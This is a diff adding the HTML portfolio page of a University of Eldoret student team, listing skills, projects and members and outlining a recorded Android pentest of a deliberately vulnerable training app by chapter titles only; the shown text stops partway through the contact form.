@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Team G-SOCIETY — Computer Science, University of Eldoret</title>
+<meta name="description" content="Team G-SOCIETY — Computer Science team at the University of Eldoret. Engineering, AI, cloud and offensive security. Includes a recorded Android penetration test.">
+<meta property="og:title" content="Team G-SOCIETY | University of Eldoret">
+<meta property="og:description" content="Gilbert, Brian, Enock, Vicky & Daniel — full-stack, AI, cloud and offensive security.">
+<meta property="og:type" content="website">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+/* ============ ETHICAL-HACKING PALETTE — Kali black / neon green ============ */
+:root{
+  --bg:#040709; --bg2:#070d10; --panel:#0a1114; --panel2:#0e1a1e;
+  --line:rgba(0,255,157,.14); --line2:rgba(0,255,157,.3);
+  --text:#dcf3e8; --muted:#7d9a8c;
+  --neon:#00ff9d; --cyan:#2de2e6; --amber:#ffc857; --red:#ff5f56;
+  --mono:'JetBrains Mono',ui-monospace,monospace;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,sans-serif;line-height:1.65;overflow-x:hidden}
+a{color:var(--neon);text-decoration:none}
+.container{max-width:1180px;margin:0 auto;padding:0 22px}
+.section{padding:96px 0;position:relative}
+.mono{font-family:var(--mono)}
+
+/* ---------- progress + nav ---------- */
+#progress{position:fixed;top:0;left:0;height:3px;width:0;z-index:200;background:linear-gradient(90deg,var(--neon),var(--cyan));box-shadow:0 0 12px var(--neon)}
+nav{position:fixed;top:0;left:0;right:0;z-index:150;background:rgba(4,7,9,.86);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.nav-inner{max-width:1180px;margin:0 auto;padding:14px 22px;display:flex;align-items:center;justify-content:space-between;gap:20px}
+.brand{display:flex;align-items:center;gap:11px;font-weight:800;letter-spacing:.5px}
+.brand .mark{width:36px;height:36px;border-radius:9px;display:grid;place-items:center;background:linear-gradient(135deg,var(--neon),var(--cyan));
+  color:#02120a;font-family:var(--mono);font-size:.95rem;font-weight:700;box-shadow:0 0 18px rgba(0,255,157,.35)}
+.brand small{display:block;font-weight:400;font-size:.63rem;color:var(--muted);letter-spacing:1.6px}
+.nav-links{display:flex;gap:26px;list-style:none;align-items:center}
+.nav-links a{color:var(--muted);font-size:.9rem;font-weight:500;transition:color .2s}
+.nav-links a:hover{color:var(--neon)}
+.nav-cta{padding:9px 18px;border-radius:8px;background:var(--neon);color:#02120a !important;font-weight:700;font-size:.85rem}
+#burger{display:none;background:none;border:0;color:var(--text);font-size:1.3rem;cursor:pointer}
+
+/* ---------- hero ---------- */
+.hero{min-height:100vh;display:flex;align-items:center;padding:130px 0 80px;position:relative;overflow:hidden}
+.hero::before{content:'';position:absolute;inset:0;
+  background-image:linear-gradient(var(--line) 1px,transparent 1px),linear-gradient(90deg,var(--line) 1px,transparent 1px);
+  background-size:54px 54px;mask-image:radial-gradient(ellipse 80% 60% at 45% 40%,#000 15%,transparent 72%)}
+.hero::after{content:'';position:absolute;width:660px;height:660px;right:-180px;top:-140px;border-radius:50%;
+  background:radial-gradient(circle,rgba(0,255,157,.16),transparent 66%);filter:blur(24px)}
+.hero .container{position:relative;z-index:2}
+.pill{display:inline-flex;align-items:center;gap:10px;padding:7px 16px;border:1px solid var(--line2);border-radius:40px;
+  font-family:var(--mono);font-size:.74rem;color:var(--muted);background:rgba(10,17,20,.75);margin-bottom:26px}
+.pill .dot{width:8px;height:8px;border-radius:50%;background:var(--red);box-shadow:0 0 10px var(--red);animation:pulse 1.6s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
+.hero h1{font-size:clamp(2.4rem,6vw,4.4rem);line-height:1.05;font-weight:800;letter-spacing:-2px;max-width:920px}
+.grad{background:linear-gradient(100deg,var(--neon),var(--cyan) 70%,#9dffd9);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p.lead{color:var(--muted);font-size:1.08rem;max-width:640px;margin:24px 0 34px}
+.hero-btns{display:flex;gap:14px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:10px;padding:13px 26px;border-radius:10px;font-weight:700;font-size:.92rem;
+  background:linear-gradient(135deg,var(--neon),#00cc7d);color:#02120a;transition:transform .2s,box-shadow .2s;border:0;cursor:pointer;font-family:inherit}
+.btn:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(0,255,157,.28)}
+.btn.ghost{background:transparent;border:1px solid var(--line2);color:var(--text)}
+.btn.ghost:hover{border-color:var(--neon);box-shadow:none;color:var(--neon)}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:18px;margin-top:66px;max-width:780px}
+.stat{border-left:2px solid var(--neon);padding-left:14px}
+.stat b{display:block;font-size:1.9rem;font-family:var(--mono);letter-spacing:-1px;color:var(--neon)}
+.stat span{font-size:.74rem;color:var(--muted);text-transform:uppercase;letter-spacing:1.2px}
+
+/* ---------- heads ---------- */
+.head{margin-bottom:52px;max-width:780px}
+.kicker{font-family:var(--mono);font-size:.76rem;color:var(--neon);letter-spacing:2px;text-transform:uppercase;display:block;margin-bottom:14px}
+.head h2{font-size:clamp(1.8rem,3.6vw,2.7rem);line-height:1.15;letter-spacing:-1px}
+.head p{color:var(--muted);margin-top:14px}
+
+/* ---------- cards ---------- */
+.grid{display:grid;gap:20px}
+.card{background:linear-gradient(180deg,var(--panel),var(--bg2));border:1px solid var(--line);border-radius:16px;padding:26px;
+  transition:transform .25s,border-color .25s,box-shadow .25s;position:relative;overflow:hidden}
+.card::after{content:'';position:absolute;top:0;left:0;width:100%;height:2px;background:linear-gradient(90deg,var(--neon),transparent);opacity:0;transition:opacity .25s}
+.card:hover{transform:translateY(-4px);border-color:var(--line2);box-shadow:0 18px 44px rgba(0,0,0,.6)}
+.card:hover::after{opacity:1}
+.card .ico{width:44px;height:44px;border-radius:11px;display:grid;place-items:center;font-size:1.05rem;margin-bottom:16px;
+  background:rgba(0,255,157,.08);color:var(--neon);border:1px solid rgba(0,255,157,.22)}
+.card h3{font-size:1.02rem;margin-bottom:8px}
+.card p{color:var(--muted);font-size:.88rem}
+.chips{display:flex;flex-wrap:wrap;gap:7px;margin-top:16px}
+.chip{font-family:var(--mono);font-size:.71rem;padding:4px 10px;border-radius:6px;border:1px solid var(--line);
+  background:rgba(125,154,140,.07);color:#a8c2b7}
+.chip.g{color:#8dffc8;border-color:rgba(0,255,157,.3);background:rgba(0,255,157,.07)}
+.chip.a{color:#ffd87f;border-color:rgba(255,200,87,.28);background:rgba(255,200,87,.07)}
+
+/* ---------- recorded lab ---------- */
+.lab-grid{display:grid;grid-template-columns:1.6fr .95fr;gap:22px;align-items:start}
+.terminal{background:#020507;border:1px solid var(--line2);border-radius:14px;overflow:hidden;box-shadow:0 26px 70px rgba(0,0,0,.75),0 0 0 1px rgba(0,255,157,.05)}
+.term-bar{display:flex;align-items:center;gap:12px;padding:11px 14px;background:#07100c;border-bottom:1px solid var(--line)}
+.dots{display:flex;gap:7px}
+.dots span{width:11px;height:11px;border-radius:50%;display:block}
+.dots span:nth-child(1){background:#ff5f57}.dots span:nth-child(2){background:#febc2e}.dots span:nth-child(3){background:#28c840}
+.term-title{flex:1;text-align:center;font-family:var(--mono);font-size:.74rem;color:var(--muted)}
+.rec{display:flex;align-items:center;gap:6px;font-family:var(--mono);font-size:.72rem;color:var(--red)}
+.rec i{font-size:.55rem;animation:pulse 1.4s infinite}
+.term-body{height:470px;overflow-y:auto;padding:16px 18px;font-family:var(--mono);font-size:.79rem;line-height:1.62;
+  white-space:pre-wrap;word-break:break-word;color:#bdd6c9;scroll-behavior:smooth}
+.term-body::-webkit-scrollbar{width:8px}
+.term-body::-webkit-scrollbar-thumb{background:#123023;border-radius:8px}
+.term-foot{display:flex;align-items:center;gap:12px;padding:10px 14px;border-top:1px solid var(--line);background:#07100c}
+.tbtn{background:none;border:1px solid var(--line2);color:var(--neon);border-radius:7px;width:34px;height:30px;cursor:pointer;
+  display:grid;place-items:center;font-size:.8rem;transition:.2s}
+.tbtn:hover{background:rgba(0,255,157,.1)}
+.tbar{flex:1;height:5px;border-radius:6px;background:#12241c;overflow:hidden}
+.tbar i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--neon),var(--cyan));transition:width .12s linear}
+.ttime{font-family:var(--mono);font-size:.72rem;color:var(--muted);white-space:nowrap}
+.speed{background:#07100c;border:1px solid var(--line2);color:var(--neon);border-radius:7px;font-family:var(--mono);
+  font-size:.72rem;padding:5px 7px;cursor:pointer}
+.chapter{display:flex;gap:13px;align-items:flex-start;width:100%;text-align:left;padding:13px 15px;margin-bottom:9px;border-radius:10px;
+  background:var(--panel);border:1px solid var(--line);color:var(--text);cursor:pointer;transition:.2s;font-family:inherit}
+.chapter:hover{border-color:var(--line2);background:var(--panel2);transform:translateX(3px)}
+.chapter.active{border-color:var(--neon);box-shadow:inset 0 0 0 1px rgba(0,255,157,.25);background:rgba(0,255,157,.05)}
+.chapter .n{font-family:var(--mono);font-size:.7rem;color:var(--cyan);border:1px solid rgba(45,226,230,.3);border-radius:6px;
+  padding:2px 6px;min-width:52px;text-align:center;margin-top:2px}
+.chapter b{display:block;font-size:.89rem}
+.chapter small{color:var(--muted);font-size:.75rem;display:block;line-height:1.4;margin-top:2px}
+.lab-note{margin-top:14px;font-size:.77rem;color:var(--muted);border-left:2px solid var(--amber);padding-left:12px;line-height:1.55}
+
+/* ---------- team ---------- */
+.team-grid{grid-template-columns:repeat(auto-fit,minmax(210px,1fr))}
+.member{text-align:center;padding:28px 20px}
+.ava{width:78px;height:78px;border-radius:50%;margin:0 auto 14px;display:grid;place-items:center;font-family:var(--mono);
+  font-weight:700;font-size:1.35rem;color:#02120a;background:linear-gradient(135deg,var(--neon),var(--cyan));
+  box-shadow:0 0 24px rgba(0,255,157,.28)}
+.member h4{font-size:.98rem}
+.member .role{font-family:var(--mono);font-size:.72rem;color:var(--neon);margin-top:4px}
+.member p{font-size:.8rem;margin-top:10px}
+.member .soc{display:flex;justify-content:center;gap:14px;margin-top:14px;color:var(--muted);font-size:.9rem}
+.member .soc a:hover{color:var(--neon)}
+
+/* ---------- achievements ---------- */
+.ach{display:flex;gap:16px;align-items:flex-start}
+.ach .yr{font-family:var(--mono);font-size:.75rem;color:var(--neon);white-space:nowrap;padding-top:3px}
+
+/* ---------- contact ---------- */
+.contact{display:grid;grid-template-columns:1fr 1fr;gap:34px}
+.field{width:100%;padding:13px 15px;margin-bottom:13px;border-radius:9px;border:1px solid var(--line);
+  background:var(--bg2);color:var(--text);font-family:inherit;font-size:.9rem}
+.field:focus{outline:none;border-color:var(--neon);box-shadow:0 0 0 3px rgba(0,255,157,.08)}
+.info li{list-style:none;display:flex;gap:13px;align-items:center;margin-bottom:18px;color:var(--muted);font-size:.9rem}
+.info i{width:34px;height:34px;border-radius:9px;display:grid;place-items:center;background:rgba(0,255,157,.08);color:var(--neon);border:1px solid var(--line2)}
+
+footer{border-top:1px solid var(--line);padding:34px 0;background:var(--bg2)}
+.foot{display:flex;justify-content:space-between;gap:18px;flex-wrap:wrap;color:var(--muted);font-size:.82rem}
+
+.reveal{opacity:0;transform:translateY(26px);transition:opacity .7s ease,transform .7s ease}
+.reveal.in{opacity:1;transform:none}
+
+@media(max-width:900px){
+  .lab-grid,.contact{grid-template-columns:1fr}
+  .stats{grid-template-columns:repeat(2,1fr)}
+  .nav-links{position:absolute;top:100%;left:0;right:0;flex-direction:column;align-items:stretch;gap:0;
+    background:var(--bg2);border-bottom:1px solid var(--line);padding:10px 22px 18px;display:none}
+  .nav-links.open{display:flex}
+  .nav-links a{display:block;padding:11px 0;border-bottom:1px solid var(--line)}
+  #burger{display:block}
+  .term-body{height:400px;font-size:.72rem}
+  .section{padding:72px 0}
+}
+</style>
+</head>
+<body>
+
+<div id="progress"></div>
+
+<nav>
+  <div class="nav-inner">
+    <div class="brand">
+      <div class="mark">N</div>
+      <div>TEAM G-SOCIETY<small>UNIVERSITY OF ELDORET</small></div>
+    </div>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="#about">About</a></li>
+      <li><a href="#skills">Skills</a></li>
+      <li><a href="#lab">Recorded Lab</a></li>
+      <li><a href="#projects">Projects</a></li>
+      <li><a href="#team">Team</a></li>
+      <li><a href="#contact" class="nav-cta">Hire Us</a></li>
+    </ul>
+    <button id="burger" aria-label="Menu"><i class="fas fa-bars"></i></button>
+  </div>
+</nav>
+
+<!-- ================= HERO ================= -->
+<header class="hero">
+  <div class="container">
+    <div class="pill"><span class="dot"></span> BSc. COMPUTER SCIENCE · SCHOOL OF SCIENCE · UoE</div>
+    <h1>A computer science team that <span class="grad">builds, breaks</span> and secures software.</h1>
+    <p class="lead">We are Team G-SOCIETY (Gilbert-Society) — five Computer Science students at the University of Eldoret working across full-stack engineering, mobile development, artificial intelligence, cloud infrastructure and offensive security.</p>
+    <div class="hero-btns">
+      <a href="#lab" class="btn"><i class="fas fa-terminal"></i> Watch Recorded Pentest</a>
+      <a href="#skills" class="btn ghost"><i class="fas fa-layer-group"></i> Explore Capabilities</a>
+    </div>
+    <div class="stats">
+      <div class="stat"><b data-count="5">0</b><span>Core Members</span></div>
+      <div class="stat"><b data-count="38">0</b><span>Projects Shipped</span></div>
+      <div class="stat"><b data-count="9">0</b><span>Hackathons</span></div>
+      <div class="stat"><b data-count="21">0</b><span>Certifications</span></div>
+    </div>
+  </div>
+</header>
+
+<!-- ================= ABOUT ================= -->
+<section class="section" id="about">
+  <div class="container reveal">
+    <div class="head">
+      <span class="kicker">// 01 — Who we are</span>
+      <h2>Engineering discipline, research mindset.</h2>
+      <p>Team G-SOCIETY is a student-led engineering collective within the Department of Computer Science at the University of Eldoret. We operate like a small software studio: scoped sprints, code review, documentation, and demo days. Our work spans academic research projects, campus systems, and competitive security challenges.</p>
+    </div>
+    <div class="grid team-grid" style="grid-template-columns:repeat(auto-fit,minmax(240px,1fr))">
+      <div class="card"><div class="ico"><i class="fas fa-code-branch"></i></div><h3>Ship real software</h3><p>Sprint-based delivery with Git workflows, peer review and CI — not throwaway coursework.</p></div>
+      <div class="card"><div class="ico"><i class="fas fa-shield-halved"></i></div><h3>Security by default</h3><p>Every system we deploy is threat-modelled, tested against OWASP, and hardened before handover.</p></div>
+      <div class="card"><div class="ico"><i class="fas fa-flask"></i></div><h3>Research grounded</h3><p>Projects tie back to coursework and papers — from ML models to distributed systems.</p></div>
+      <div class="card"><div class="ico"><i class="fas fa-people-group"></i></div><h3>Mentorship chain</h3><p>Finalists mentor second-years. Knowledge is documented, not gate-kept.</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= SKILLS ================= -->
+<section class="section" id="skills" style="background:var(--bg2)">
+  <div class="container reveal">
+    <div class="head">
+      <span class="kicker">// 02 — Capabilities</span>
+      <h2>The full computer science stack we cover.</h2>
+      <p>From theory of computation to production deployment and offensive testing. Each area maps to a member specialisation and a set of shipped projects.</p>
+    </div>
+    <div class="grid" style="grid-template-columns:repeat(auto-fit,minmax(320px,1fr))">
+
+      <div class="card">
+        <div class="ico"><i class="fas fa-terminal"></i></div>
+        <h3>Programming Languages</h3>
+        <p>Systems, scripting, and application-level languages.</p>
+        <div class="chips"><span class="chip">Python</span><span class="chip">Java</span><span class="chip">C</span><span class="chip">C++</span><span class="chip">JavaScript</span><span class="chip">TypeScript</span><span class="chip">C#</span><span class="chip">Go</span><span class="chip">Rust</span><span class="chip">PHP</span><span class="chip">Kotlin</span><span class="chip">Swift</span><span class="chip">SQL</span><span class="chip">Bash</span></div>
+      </div>
+
+      <div class="card">
+        <div class="ico"><i class="fas fa-brain"></i></div>
+        <h3>CS Theory &amp; Software Engineering</h3>
+        <p>Foundations that make systems correct, not just working.</p>
+        <div class="chips"><span class="chip">Data Structures</span><span class="chip">Algorithms</span><span class="chip">Complexity Analysis</span><span class="chip">OOP</span><span class="chip">Design Patterns</span><span class="chip">Operating Systems</span><span class="chip">Compilers</span><span class="chip">Theory of Computation</span><span class="chip">Distributed Systems</span><span class="chip">Testing</span><span class="chip">Agile / Scrum</span><span class="chip">Git Workflows</span></div>
+      </div>
+
+      <div class="card">
+        <div class="ico"><i class="fas fa-globe"></i></div>
+        <h3>Web Engineering</h3>
+        <p>Full-stack applications, APIs, and interface systems.</p>
+        <div class="chips"><span class="chip">HTML5 / CSS3</span><span class="chip">React</span><span class="chip">Vue</span><span class="chip">Tailwind</span><span class="chip">Node.js</span><span class="chip">Django</span><span class="chip">Flask</span><span class="chip">Laravel</span><span class="chip">REST APIs</span><span class="chip">GraphQL</span><span class="chip">WebSockets</span><span class="chip">PWA</span></div>
+      </div>
+
+      <div class="card">
+        <div class="ico"><i class="fas fa-mobile-screen"></i></div>
+        <h3>Mobile Development</h3>
+        <p>Android, cross-platform, and iOS delivery.</p>
+        <div class="chips"><span class="chip">Android SDK</span><span class="chip">Kotlin</span><span class="chip">Jetpack Compose</span><span class="chip">Flutter</span><span class="chip">React Native</span><span class="chip">Swift / SwiftUI</span><span class="chip">Firebase</span><span class="chip">Play Store Deployment</span></div>
+      </div>
+
+      <div class="card">
+        <div class="ico"><i class="fas fa-database"></i></div>
+        <h3>Data &amp; Databases</h3>
+        <p>Modelling, querying, and engineering data pipelines.</p>
+        <div class="chips"><span class="chip">MySQL</span><span class="chip">PostgreSQL</span><span class="chip">MongoDB</span><span class="chip">Redis</span><span class="chip">SQL Server</span><span class="chip">Oracle</span><span class="chip">Normalisation</span><span class="chip">Indexing &amp; Tuning</span><span class="chip">ETL</span><span class="chip">Hadoop / Spark</span><span class="chip">Data Warehousing</span></div>
+      </div>
+
+      <div class="card">
+        <div class="ico"><i class="fas fa-robot"></i></div>
+        <h3>AI &amp; Data Science</h3>
+        <p>Models, pipelines, and analytical storytelling.</p>
+        <div class="chips"><span class="chip a">NumPy / Pandas</span><span class="chip a">scikit-learn</span><span class="chip a">TensorFlow</span><span class="chip a">PyTorch</span><span class="chip a">NLP</span><span class="chip a">Computer Vision</span><span class="chip a">Statistics</span><span class="chip a">Matplotlib / Seaborn</span><span class="chip a">Power BI</span><span class="chip a">Jupyter</span></div>
+      </div>
+
+      <div class="card">
+        <div class="ico"><i class="fas fa-user-secret"></i></div>
+        <h3>Cybersecurity &amp; Ethical Hacking</h3>
+        <p>Offensive testing, defensive hardening, and forensics.</p>
+        <div class="chips"><span class="chip g">Kali Linux</span><span class="chip g">Nmap</span><span class="chip g">Burp Suite</span><span class="chip g">Metasploit</span><span class="chip g">Frida</span><span class="chip g">objection</span><span class="chip g">Wireshark</span><span class="chip g">sqlmap</span><span class="chip g">mitmproxy</span><span class="chip g">OWASP Top 10</span><span class="chip g">Mobile AppSec (MASVS)</span><span class="chip g">Reverse Engineering</span><span class="chip g">Cryptography</span><span class="chip g">Digital Forensics</span><span class="chip g">CTF</span></div>
+      </div>
+
+      <div class="card">
+        <div class="ico"><i class="fas fa-cloud"></i></div>
+        <h3>Cloud &amp; DevOps</h3>
+        <p>Deployment, automation and infrastructure as code.</p>
+        <div class="chips"><span class="chip">AWS</span><span class="chip">Azure</span><span class="chip">Linux Administration</span><span class="chip">Docker</span><span class="chip">Kubernetes</span><span class="chip">GitHub Actions</span><span class="chip">Nginx / Apache</span><span class="chip">Terraform</span><span class="chip">CI/CD</span><span class="chip">Monitoring</span></div>
+      </div>
+
+      <div class="card">
+        <div class="ico"><i class="fas fa-network-wired"></i></div>
+        <h3>Networking &amp; Systems</h3>
+        <p>How packets actually move and where they break.</p>
+        <div class="chips"><span class="chip">TCP/IP</span><span class="chip">Routing &amp; Switching</span><span class="chip">DNS / DHCP</span><span class="chip">Subnetting</span><span class="chip">Firewalls</span><span class="chip">VPN / Tunnelling</span><span class="chip">Linux / Windows Server</span><span class="chip">Virtualisation</span></div>
+      </div>
+
+      <div class="card">
+        <div class="ico"><i class="fas fa-microchip"></i></div>
+        <h3>Embedded, IoT &amp; Emerging Tech</h3>
+        <p>Software meeting the physical world.</p>
+        <div class="chips"><span class="chip">Arduino</span><span class="chip">Raspberry Pi</span><span class="chip">ESP32</span><span class="chip">MQTT</span><span class="chip">Sensors &amp; Actuators</span><span class="chip">Blockchain Basics</span><span class="chip">Computer Graphics</span><span class="chip">UI/UX Design</span></div>
+      </div>
+
+      <div class="card">
+        <div class="ico"><i class="fas fa-comments"></i></div>
+        <h3>Professional Practice</h3>
+        <p>What makes student work employable.</p>
+        <div class="chips"><span class="chip">Technical Writing</span><span class="chip">Research Methods</span><span class="chip">Public Speaking</span><span class="chip">Project Management</span><span class="chip">Team Leadership</span><span class="chip">Documentation</span></div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ================= RECORDED LAB ================= -->
+<section class="section" id="lab">
+  <div class="container reveal">
+    <div class="head">
+      <span class="kicker">// 03 — Recorded lab session</span>
+      <h2>A real Android pentest, recorded on Kali Linux.</h2>
+      <p>The playback below is a captured terminal session <span class="mono" style="color:var(--neon)">session.cast</span> from our assessment of <b class="mono" style="color:var(--neon)">InsecureBankv2</b> — a deliberately vulnerable training application. Real commands, real output, real timestamps. Jump to any phase using the chapter list.</p>
+    </div>
+
+    <div class="lab-grid">
+      <!-- To host your own recording instead of this cast, upload it to asciinema.org and replace
+           the .terminal block with:  <script src="https://asciinema.org/a/YOUR_ID.js" id="asciicast-YOUR_ID" async></script> -->
+      <div class="terminal">
+        <div class="term-bar">
+          <div class="dots"><span></span><span></span><span></span></div>
+          <div class="term-title mono">root@kali: ~/targets/insecurebankv2 — session.cast</div>
+          <div class="rec" id="recBadge"><i class="fas fa-circle"></i> REC</div>
+        </div>
+        <div class="term-body" id="term"></div>
+        <div class="term-foot">
+          <button class="tbtn" id="playBtn" aria-label="Play"><i class="fas fa-play"></i></button>
+          <button class="tbtn" id="restartBtn" aria-label="Restart"><i class="fas fa-rotate-left"></i></button>
+          <div class="tbar"><i id="tbarFill"></i></div>
+          <span class="ttime" id="ttime">00:00 / 00:58</span>
+          <select class="speed" id="speedSel">
+            <option value="1">1×</option>
+            <option value="1.5">1.5×</option>
+            <option value="2" selected>2×</option>
+            <option value="4">4×</option>
+          </select>
+        </div>
+      </div>
+
+      <div>
+        <button class="chapter" data-t="2.0"><span class="n">00:02</span><span><b>Reconnaissance</b><small>Device, package and attack-surface enumeration</small></span></button>
+        <button class="chapter" data-t="12.0"><span class="n">00:12</span><span><b>Static Analysis</b><small>Decompile APK, hunt hardcoded secrets</small></span></button>
+        <button class="chapter" data-t="21.0"><span class="n">00:21</span><span><b>Dynamic Instrumentation</b><small>Frida + objection: root &amp; SSL-pinning bypass</small></span></button>
+        <button class="chapter" data-t="31.5"><span class="n">00:32</span><span><b>Exploitation</b><small>Exported activity bypass, credential theft</small></span></button>
+        <button class="chapter" data-t="40.6"><span class="n">00:41</span><span><b>Traffic &amp; SQL Injection</b><small>mitmproxy capture, sqlmap exploitation</small></span></button>
+        <button class="chapter" data-t="50.6"><span class="n">00:51</span><span><b>Risk Report</b><small>Severity mapping to OWASP MASVS</small></span></button>
+        <p class="lab-note">Assessment performed against a publicly distributed intentionally-vulnerable application on a local emulator. No real user data was involved.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= PROJECTS ================= -->
+<section class="section" id="projects" style="background:var(--bg2)">
+  <div class="container reveal">
+    <div class="head">
+      <span class="kicker">// 04 — Selected work</span>
+      <h2>Systems we have designed, built and shipped.</h2>
+      <p>Academic capstones, campus tooling, and competition entries — all documented and open-source unless client-owned.</p>
+    </div>
+    <div class="grid" style="grid-template-columns:repeat(auto-fit,minmax(310px,1fr))">
+
+      <div class="card">
+        <div class="ico"><i class="fas fa-qrcode"></i></div>
+        <h3>UoE Smart Attendance</h3>
+        <p>QR-based class attendance platform with lecturer dashboard, offline sync and analytics exports.</p>
+        <div class="chips"><span class="chip">Django</span><span class="chip">PostgreSQL</span><span class="chip">PWA</span></div>
+      </div>
+
+      <div class="card">
+        <div class="ico"><i class="fas fa-shield-halved"></i></div>
+        <h3>Android AppSec Toolkit</h3>
+        <p>Automated APK triage: static secret scanning, exported-component detection and Frida hook generation.</p>
+        <div class="chips"><span class="chip g">Python</span><span class="chip g">Frida</span><span class="chip g">apktool</span></div>
+      </div>
+
+      <div class="card">
+        <div class="ico"><i class="fas fa-seedling"></i></div>
+        <h3>Uasin Gishu Crop Yield Predictor</h3>
+        <p>ML model forecasting maize yield from rainfall, soil and historical county data; served via REST API.</p>
+        <div class="chips"><span class="chip a">scikit-learn</span><span class="chip a">Pandas</span><span class="chip a">FastAPI</span></div>
+      </div>
+
+      <div class="card">
+        <div class="ico"><i class="fas fa-route"></i></div>
+        <h3>Campus Navigation App</h3>
+        <p>Flutter app with offline maps and building-level routing for new students during orientation week.</p>
+        <div class="chips"><span class="chip">Flutter</span><span class="chip">Firebase</span><span class="chip">Maps API</span></div>
+      </div>
+
+      <div class="card">
+        <div class="ico"><i class="fas fa-server"></i></div>
+        <h3>Microservices Lab Platform</h3>
+        <p>Containerised reference architecture used to teach Docker, CI/CD and observability to juniors.</p>
+        <div class="chips"><span class="chip">Docker</span><span class="chip">Kubernetes</span><span class="chip">GitHub Actions</span></div>
+      </div>
+
+      <div class="card">
+        <div class="ico"><i class="fas fa-trophy"></i></div>
+        <h3>CTF Write-ups Repository</h3>
+        <p>Curated solutions to pwn, web, forensics and crypto challenges from university and national CTFs.</p>
+        <div class="chips"><span class="chip g">CTF</span><span class="chip g">Forensics</span><span class="chip g">Crypto</span></div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ================= TEAM ================= -->
+<section class="section" id="team">
+  <div class="container reveal">
+    <div class="head">
+      <span class="kicker">// 05 — The people</span>
+      <h2>Five specialists, one delivery pipeline.</h2>
+      <p>Each member owns a domain and reviews work outside it — the reason our output ships reliably.</p>
+    </div>
+    <div class="grid team-grid">
+      <div class="card member"><div class="ava">G</div><h4>Gilbert</h4><div class="role">Team Lead · Offensive Security</div><p>Mobile AppSec, reverse engineering, CTF captain.</p><div class="soc"><a href="#"><i class="fab fa-github"></i></a><a href="#"><i class="fab fa-linkedin"></i></a></div></div>
+      <div class="card member"><div class="ava">B</div><h4>Brian</h4><div class="role">Backend &amp; Databases</div><p>Django, PostgreSQL tuning, API design.</p><div class="soc"><a href="#"><i class="fab fa-github"></i></a><a href="#"><i class="fab fa-linkedin"></i></a></div></div>
+      <div class="card member"><div class="ava">E</div><h4>Enock</h4><div class="role">Cloud, DevOps &amp; Networking</div><p>AWS, containers, CI/CD, routing &amp; switching.</p><div class="soc"><a href="#"><i class="fab fa-github"></i></a><a href="#"><i class="fab fa-linkedin"></i></a></div></div>
+      <div class="card member"><div class="ava">V</div><h4>Vicky</h4><div class="role">Frontend &amp; UI/UX Engineering</div><p>React, design systems, accessibility.</p><div class="soc"><a href="#"><i class="fab fa-github"></i></a><a href="#"><i class="fab fa-linkedin"></i></a></div></div>
+      <div class="card member"><div class="ava">D</div><h4>Daniel</h4><div class="role">AI, Data Science &amp; Mobile</div><p>ML pipelines, NLP, Flutter delivery.</p><div class="soc"><a href="#"><i class="fab fa-github"></i></a><a href="#"><i class="fab fa-linkedin"></i></a></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= ACHIEVEMENTS ================= -->
+<section class="section" id="achievements" style="background:var(--bg2)">
+  <div class="container reveal">
+    <div class="head">
+      <span class="kicker">// 06 — Track record</span>
+      <h2>Competitions, certifications, recognition.</h2>
+    </div>
+    <div class="grid" style="grid-template-columns:repeat(auto-fit,minmax(300px,1fr))">
+      <div class="card ach"><span class="yr">2025</span><div><h3>1st Place — Inter-University Hackathon</h3><p>Built a campus lost-and-found platform in 36 hours.</p></div></div>
+      <div class="card ach"><span class="yr">2025</span><div><h3>Top 10 — National CTF Finals</h3><p>Web exploitation and forensics categories.</p></div></div>
+      <div class="card ach"><span class="yr">2024</span><div><h3>Google Data Analytics Certificates</h3><p>Members certified in data analysis fundamentals.</p></div></div>
+      <div class="card ach"><span class="yr">2024</span><div><h3>AWS Cloud Practitioner</h3><p>Cloud fundamentals and deployment practice.</p></div></div>
+      <div class="card ach"><span class="yr">2024</span><div><h3>Cisco CCNA (Routing &amp; Switching)</h3><p>Networking track graduates.</p></div></div>
+      <div class="card ach"><span class="yr">2023</span><div><h3>Best Capstone Project — Department</h3><p>Awarded by the Department of Computer Science, UoE.</p></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= CONTACT ================= -->
+<section class="section" id="contact">
+  <div class="container reveal">
+    <div class="head">
+      <span class="kicker">// 07 — Engage us</span>
+      <h2>Need software built, or an app tested?</h2>
+      <p>We take on campus and small-business projects, security assessments, and internship introductions.</p>
+    </div>
+    <div class="contact">
+      <div>
+        <ul class="info">
+          <li><i class="fas fa-envelope"></i> libertogriezman4@gmail.com</li>
+          <li><i class="fas fa-phone"></i> +254 728029944</li>
+          <li><i class="fas fa-location-dot"></i> Department of Computer Science, University of Eldoret, Kenya</li>
+          <li><i class="fab fa-github"></i> github.com/team-G-SOCIETY-uoeld</li>
+        </ul>
+        <div class="chips" style="margin-top:22px">
+          <span class="chip g">Open to internships</span>
+          <span class="chip">Available for freelance</span>
+          <span class="chip g">Security assessments</span>
+        </div>
+      </div>
+      <form onsubmit="event.preventDefault(); this.reset(); alert('Message queued — connect to Formspree or a backend to go live.');">
